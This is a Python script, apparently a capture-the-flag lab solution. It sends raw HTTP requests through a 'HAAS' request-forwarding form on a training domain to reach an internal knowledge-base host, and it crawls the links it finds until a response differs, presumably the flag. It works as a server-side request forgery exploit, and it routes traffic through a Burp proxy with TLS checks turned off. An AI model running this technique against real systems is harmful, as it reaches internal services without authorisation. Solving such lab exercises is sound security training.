import requests
import time
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Function to send the POST request
def send_post_request(session, url, payload):
    response = session.post(url, data={'requestBox': payload})
    return response

# Function to set the payload of post request given the link
def set_payload(link):
    payload = f"""GET {link} HTTP/1.1
Host: kb.quoccabank.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://hass.quoccabank.com/
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://hass.quoccabank.com
Connection: keep-alive
\n\n
"""
    return payload


# function takes the raw response, and parses the links into an array and returns it.
def raw_response_to_array(response):
    soup = BeautifulSoup(response.content, 'html.parser')
    links = soup.find_all('a', href=True)
    link_array = [link['href'] for link in links]
    return link_array


# Set up the session
s = requests.session()
s.verify = False  # Skip trying to verify TLS certs.
s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # Proxy requests through Burp.

url = "https://haas.quoccabank.com"

# sets initial payload, does POST request, stores parsed links response in links array.
initial_payload = set_payload("/deep/gF8Ot0IwaC")
initial_response = send_post_request(s, url, initial_payload)
links_array = raw_response_to_array(initial_response)

tried_links_array = []


# Loop to perform the process 100 times
for i in range(1000000000):
    if not links_array:
        break  # If the list is empty, exit the loop
    
    # Pop the first link and set up the payload
    link_to_request = links_array.pop(0)

    # Check if the link has already been tried
    if link_to_request in tried_links_array:
        print(f"Skipping request for {link_to_request}, already tried.")
        continue

    tried_links_array.append(link_to_request)
    payload = set_payload(link_to_request)
    
    # Send the request and print when a request is sent
    print(f"Sending request for {link_to_request}")
    response = send_post_request(s, url, payload)

    #finds any variations in format (hopefully the flag!)
    if len(response.content) != 1078:
        print("it's different!!\n")
        exit()

    new_links = raw_response_to_array(response)
    
    # Append the new links to the links_array
    links_array.extend(new_links)
    time.sleep(0.01)

# print the final links_array
print("Final links_array:")
for link in links_array:
    print(link)

# print tried links
print("tried links:")
print(tried_links_array)
